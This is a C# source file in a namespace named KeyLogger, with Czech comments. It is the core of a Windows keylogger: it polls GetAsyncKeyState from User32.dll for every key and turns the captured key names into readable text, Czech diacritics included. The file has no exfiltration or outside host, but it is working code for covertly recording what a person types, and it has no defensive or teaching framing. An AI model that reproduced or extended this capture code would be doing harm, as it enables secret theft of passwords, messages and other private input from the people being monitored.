using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;
namespace KeyLogger
{
    public static class Key
    {
        
        [DllImport("User32.dll")] // budeme používat tuto knihovnu
        private static extern short GetAsyncKeyState(int vKey);
        
        public static string ReplaceChars(string text)
        {
            text = text.Replace("Space", " ");
            text = text.Replace("Delete", "<Del>");
            text = text.Replace("LShiftKey", "");
            text = text.Replace("ShiftKey", "");
            text = text.Replace("OemQuotes", "!");
            text = text.Replace("Oemcomma", "?");
            text = text.Replace("D8", "á");
            text = text.Replace("D2", "ě");
            text = text.Replace("D3", "š");
            text = text.Replace("D4", "č");
            text = text.Replace("D5", "ř");
            text = text.Replace("D6", "ž");
            text = text.Replace("D7", "ý");
            text = text.Replace("D9", "í");
            text = text.Replace("D0", "é");
            text = text.Replace("Back", "<Back>");
            text = text.Replace("LButton", "");
            text = text.Replace("RButton", "");
            text = text.Replace("NumPad", "");
            text = text.Replace("OemPeriod", ".");
            text = text.Replace("OemSemicolon", ",");
            text = text.Replace("Oem4", "/");
            text = text.Replace("LControlKey", "<CTRL>");
            text = text.Replace("ControlKey", "<CTRL>");
            text = text.Replace("Enter", "<ENT>");
            text = text.Replace("Shift", "");
            text = text.Replace("<<", "");
            text = text.Replace(">>", "");
            return text;
        }
        public static string GetBuffKeys()
        {
            string buffer = "";
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767) 
                    buffer += Enum.GetName(typeof(Keys), i);
            }
            return buffer;
        }
    }
}